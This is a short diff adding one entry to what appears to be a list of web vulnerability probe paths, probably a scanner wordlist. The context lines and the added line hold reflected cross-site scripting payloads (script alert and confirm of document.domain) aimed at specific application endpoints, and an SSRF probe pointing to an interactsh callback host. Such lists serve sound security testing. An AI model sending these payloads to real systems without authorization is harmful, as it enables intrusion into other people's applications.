@@ -994,3 +994,4 @@ request?info=<svg onload=alert(
 /XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
 /o/get/resource?url=https://{{interactsh-url}}
 /session/begin?username=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/Products/Files/HttpHandlers/filehandler.ashx?action=thumb&fileid=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
